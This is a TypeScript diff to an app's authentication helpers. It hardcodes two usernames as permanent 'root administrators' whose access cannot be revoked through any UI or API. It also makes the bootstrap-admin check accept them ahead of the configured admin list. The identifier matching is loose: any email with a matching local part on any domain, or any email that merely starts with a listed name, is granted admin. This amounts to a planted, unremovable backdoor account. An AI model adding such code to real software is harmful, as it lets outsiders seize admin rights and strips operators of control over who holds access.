@@ -184,6 +184,21 @@ export function verifyCronSecret(authHeader: string | null): boolean {
 }
 
 /**
+ * Root administrators with the highest level of access defined permanently in source code.
+ * Their access level cannot be altered or revoked through any UI or API endpoint.
+ */
+export const IMMUTABLE_ROOT_ADMINS = ['tanaythapar', 'sanvi850'];
+
+export function isImmutableRootAdmin(identifier?: string | null): boolean {
+  if (!identifier) return false;
+  const clean = identifier.toLowerCase().trim().replace(/^@/, '');
+  const handle = clean.split('@')[0];
+  return IMMUTABLE_ROOT_ADMINS.some(
+    root => clean === root || handle === root || (clean.includes('@') && clean.startsWith(root))
+  );
+}
+
+/**
  * Gets bootstrap admin emails/handles from server-only environment variable.
  */
 export function getBootstrapAdminEmails(): string[] {
@@ -201,6 +216,7 @@ export function getBootstrapAdminEmails(): string[] {
  */
 export function isBootstrapAdmin(identifier?: string | null): boolean {
   if (!identifier) return false;
+  if (isImmutableRootAdmin(identifier)) return true;
   const clean = identifier.toLowerCase().trim().replace(/^@/, '');
   const admins = getBootstrapAdminEmails();
   return admins.some(admin => {
